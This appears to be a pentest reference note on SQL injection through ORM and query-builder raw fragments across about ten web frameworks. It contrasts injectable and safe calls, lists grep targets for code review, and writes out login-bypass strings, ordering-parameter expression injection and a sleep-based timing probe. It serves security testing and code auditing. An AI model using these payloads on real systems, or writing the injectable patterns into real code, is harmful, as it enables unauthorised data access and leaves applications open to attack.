# ORM / query-builder SQLi — the injection that survives "we use an ORM"

ORMs parameterise the VALUES — but many expose RAW fragments for
ordering, filtering, custom where-clauses and joins. The injection
points are the fragments: `order_by`, `where`, `select`, `group_by`,
`raw`, `extra`, `annotation`, `order`, `sort` params in APIs. A
value that reaches one of these is plain SQLi — the ORM just picks
the wrapper.

Fingerprinting the ORM helps but isn't required — find the raw
surface, then the payloads are the same SQL; what's ORM-specific is
WHERE the raw fragment lands in the grammar.

---

## 1. Django / Python

`QuerySet.extra(select=...)` / `.raw()` / `RawSQL()` / `order_by` —
the classic surfaces:

```python
User.objects.extra(select={'x': '1 or 1=1--'})       # injectable
User.objects.order_by(request.GET['sort'])            # sort param → SQLi
User.objects.raw('SELECT * FROM users WHERE name=%s',[u])  # safe param
User.objects.raw('SELECT * FROM users WHERE name='+u)      # injectable
User.objects.extra(where=[f"name='{u}'"])            # injectable
.annotate(x=RawSQL('select %s' % u, []))             # injectable
```

Real-shape detection: sort/filter params that accept column names
(often crash with a `FieldError` naming the model fields — free
column disclosure). `order_by` accepts `-` prefix for DESC — a `-`
that reorders = the param is reaching order_by:

```text
?sort=id            → normal
?sort=-id           → reversed → order_by confirmed
?sort=if(1=1,id,name)  → Django rejects non-field names...
                        UNLESS the code uses RawSQL/order_by raw —
                        then expression injection (edge-contexts §4)
```

`extra(where=)`/`raw()` in auth-ish code:

```python
User.objects.extra(where=[f"username='{u}' AND password='{p}'"])
→ u = admin'-- -  /  ' OR '1'='1
```

---

## 2. SQLAlchemy / Python

```python
session.execute(f"SELECT * FROM users WHERE name='{u}'")   # injectable
session.execute(text(f"... WHERE name='{u}'"))             # injectable
session.execute(text("... WHERE name=:n"), {'n': u})       # safe param
.query(User).filter_by(**{col: val})                       # dict-form ok
.query(User).filter(text(f"col='{v}'"))                    # injectable
.order_by(request.args['sort'])                            # column-name
                                                          # resolution —
                                                          # injectable if
                                                          # arbitrary SQL
                                                          # allowed
```

`text()` fragments still parse everything — the whole payload
catalogue applies. The `:`-param form is the tell for a SAFE call;
f-string/concat forms are the dangerous ones.

---

## 3. ActiveRecord / Rails

```ruby
User.where("name='#{u}'")               # injectable
User.where("name = ?", u)                # safe
User.order(params[:sort])                # column+dir — injectable in
                                        # old versions via SQL inside
                                        # strings? new versions parse
                                        # but expressions still land
User.select("#{params[:cols]}")         # injectable
User.group(params[:g])                   # injectable
User.find_by_sql("... #{u} ...")         # injectable
User.joins("INNER JOIN x ON #{u}")       # injectable
User.where.not(id: u)                    # object-form safe
.connection.execute("#{u}")             # raw — injectable
.pluck(params[:col])                     # column injection
```

The Rails-specific class: `order(params[:sort])` lets arbitrary SQL
through on old versions — `sort=id,if(...)`/`sort=(select ...)`
from `edge-contexts.md` §4. Modern Rails sanitises order args to a
whitelist — but custom `order_by` Arel strings don't.

`find_by_sql` + string interpolation is the auth-bypass shape:

```ruby
User.find_by_sql("SELECT * FROM users WHERE name='#{u}' AND pass='#{p}'")
→ u = admin'-- -   or  ' OR '1'='1
```

---

## 4. Hibernate / JPA / Java

```java
session.createQuery("from User where name='" + u + "'")     // HQL — injectable (HQLi!)
session.createNativeQuery("SELECT * FROM users WHERE name='" + u + "'")
                                                            // SQLi
entityManager.createQuery("... where name=:n").setParameter("n", u)
                                                            // safe
criteria.order(Order.asc(u))                                // property —
                                                            // limited
```

HQLi specifics — HQL is NOT SQL:

- No `UNION`, no stacked queries in createQuery.
- Comments `--`/`#` work; `||` concat works.
- `select` omitted → `from User where ...` — the object shape.
- Blind extraction via `substring`/`lower`/`upper`/`length` works.
- `update`/`insert`/`delete` are JPA-level ops — the fields are
  bound. Raw `createNativeQuery` is the only full-SQL surface.
- HQL error messages echo the HQL parser position — free detail.

Named/parameterized HQL is safe — the dangerous call is
string-concat `createQuery`.

`JPQL` → same rules; `Criteria API` → property names only;
`NativeQuery` → full SQLi catalogue applies.

---

## 5. Sequelize / Node

```js
User.findAll({ where: { name: u } })               // object-form safe
User.findAll({ where: literal(`name='${u}'`) })    // injectable
sequelize.query(`SELECT * FROM users WHERE name='${u}'`)  // injectable
sequelize.query('SELECT * FROM users WHERE name=?',
   { replacements: [u] })                          // safe
.order([[u, 'DESC']])                              // column-name—limited
.order(sequelize.literal(u))                       // injectable!
.attributes([u])                                   // select-list—injectable
.group(u)                                          // injectable
.where(fn('lower', col('name')), '=', u)           // fn-form — the
                                                  // bindings decide
```

The `literal()`/`sequelize.literal()` shape is THE Sequelize tell —
grep source for `literal(`. `order`/`group`/`attributes` accepting
raw strings are the sort/group injection of `edge-contexts.md` §4.

---

## 6. Knex / Node

```js
knex('users').where('name', u)                        // bound — safe
knex('users').whereRaw(`name='${u}'`)                 // injectable
knex.raw(`SELECT * FROM users WHERE name='${u}'`)     // injectable
knex('users').orderBy(u)                              // column — limited
knex('users').orderByRaw(u)                           // injectable
knex('users').select(u)                               // column-name —
                                                      // injectable if raw
knex('users').whereRaw('id=?', [u])                   // safe param
```

`whereRaw`, `orderByRaw`, `select` with raw strings — the raw-
suffix methods are the surface. `?`-bindings inside `whereRaw` are
still safe; string interpolation inside them is not.

---

## 7. Laravel / PHP — Eloquent + Query Builder

```php
User::whereRaw("name='$u'")->get();                  // injectable
User::where('name','=',$u)->get();                   // safe
User::orderBy($request->sort)->get();                // column whitelist?
User::orderByRaw($request->sort)->get();             // injectable
DB::select("SELECT * FROM users WHERE name='$u'");   // injectable
DB::select("... WHERE name=?", [$u]);                // safe
DB::statement("INSERT ...");                          // raw — context
DB::unprepared("... $u ...");                         // injectable
DB::raw($u)  inside select()/where()                  // injectable
User::selectRaw($request->cols)                       // injectable
User::groupByRaw($u)                                 // injectable
User::havingRaw($u)                                  // injectable
User::whereJsonContains('opts->key', $u)             // object-form safe
```

The `*Raw` family + `DB::raw` + `unprepared` are the injectable
calls; everything with `?`-bindings is safe.

`PDO` direct — `query()` vs `prepare()`:

```php
$pdo->query("SELECT * FROM users WHERE name='$u'");    // injectable
$pdo->exec("SELECT ... $u");                            // injectable
$pdo->prepare("... WHERE name=?");                      // safe
$pdo->prepare("... WHERE name='$u'");                   // STILL injectable!
                                                        // prepare doesn't
                                                        // fix concat
```

`prepare()` doesn't help if the string is interpolated first —
that's the most-seen CTF trap.

---

## 8. Prisma / Node

```js
prisma.$queryRaw`SELECT * FROM users WHERE name='${u}'`      // unsafe tagged
prisma.$queryRawUnsafe(`SELECT * FROM users WHERE name='${u}'`) // injectable
prisma.$executeRawUnsafe(`... ${u} ...`)                      // injectable
prisma.user.findMany({ where: { name: u } })                  // safe
prisma.user.findMany({ orderBy: { [field]: dir } })           // field-name
                                                              // only
```

`$queryRawUnsafe`/`$executeRawUnsafe` are the injectable calls —
the `Unsafe` suffix is the grep target.

---

## 9. Spring / Java — @Query and JDBC

```java
@Query("SELECT u FROM User u WHERE u.name = ?1")            // safe
@Query(value="SELECT * FROM users WHERE name='?1'",
       nativeQuery=true)                                    // still param
@Query(value="SELECT * FROM users WHERE name='" + "#{u}" + "'",
       nativeQuery=true)                                    // injectable
jdbcTemplate.queryForObject("SELECT ... WHERE name='" + u + "'") // injectable
jdbcTemplate.queryForObject("SELECT ... WHERE name=?", u)   // safe
namedParameterJdbcTemplate...                                // safe with params
```

JDBC string-concat is the shape; `?`-form is safe even in
nativeQuery.

---

## 10. Raw-fragment checklist — find the injectable calls in source

```bash
# grep targets per stack
grep -rn "extra(\|RawSQL\|order_by\|\.raw("          -- Django/SA
grep -rn "literal\|whereRaw\|orderByRaw\|\.raw("     -- Sequelize/Knex
grep -rn "Raw\|unprepared\|statement\|selectRaw"     -- Laravel/PDO
grep -rn "createQuery\|createNativeQuery\|find_by_sql" -- Hibernate/Rails
grep -rn "queryForObject\|@Query"                    -- Spring
grep -rn "queryRawUnsafe\|executeRawUnsafe"          -- Prisma
```

Inside the raw call, the payloads are the same SQL — what changes
is the WRAPPER grammar (which quoting, which comment marker, which
clause).

---

## 11. Stack-to-ORM map

| Stack | ORM | Raw surface to grep |
|---|---|---|
| Django | Django ORM | `extra`, `RawSQL`, `.raw` |
| Flask/FastAPI | SQLAlchemy | `text(`, `execute(`, `literal_column` |
| Rails | ActiveRecord | `find_by_sql`, `order`, `select` |
| Laravel | Eloquent/DB | `whereRaw`, `selectRaw`, `DB::raw` |
| Spring | Hibernate/JPA | `createNativeQuery`, `createQuery` |
| Express | Sequelize/Knex/Prisma | `literal`, `*Raw`, `Unsafe` |
| ASP.NET | EF Core / Dapper | `FromSqlRaw`, `ExecuteSqlRaw`, `Query<T>` |
| Django REST | same | ordering filter `?ordering=` |

---

## 12. Ordering param — the most common ORM injection

`?ordering=` / `?sort=` / `?order=` params are the #1 ORM SQLi
surface because they're almost always raw:

```text
?ordering=id              → ORDER BY id
?ordering=-id             → ORDER BY id DESC (Django filter)
?ordering=id,if(1=1,name,email)    → expression injection
?ordering=(select+sleep(3))         → time channel
?sort=name desc,if(cond,name,id)    → multi-key
```

The signal: does `-field` reorder? Does `field,other` multi-sort?
Then it's raw — expression payloads from `edge-contexts.md` §4.
